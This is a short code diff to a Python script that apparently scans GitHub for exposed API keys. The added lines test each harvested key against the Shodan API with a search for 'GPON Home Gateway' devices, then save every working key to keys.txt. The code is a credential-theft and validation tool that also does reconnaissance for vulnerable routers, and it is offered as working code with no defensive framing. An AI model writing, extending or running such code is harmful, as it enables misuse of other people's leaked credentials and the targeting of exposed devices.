@@ -8,6 +8,7 @@ import base64
 import argparse
 from github import Github, GithubException
 from configobj import ConfigObj
+import urllib.request
 
 
 api_entropy_limit = {
@@ -47,7 +48,18 @@ def checkForAPIKey(text):
 
     if result is not None:
         print(result.group(), end=' ')
-        print('entropy : ', entropy(result.group()))
+        print('entropy : ', entropy(result.group()))
+        try:
+            urllib.request.urlopen("https://api.shodan.io/shodan/host/search?key=" + result.group() + "&query=title%3A%22GPON%20Home%20Gateway%22%20port%3A%2280%22").read()
+            # if not exception - apikey is good
+            file = open("keys.txt","a")
+            file.write(result.group() + "\n")
+            file.close()
+            print("----------------------------------------------------------")
+            print(result.group())
+            print("----------------------------------------------------------")
+        except urllib.error.HTTPError as e:
+            print(e)
 
 
 def main():
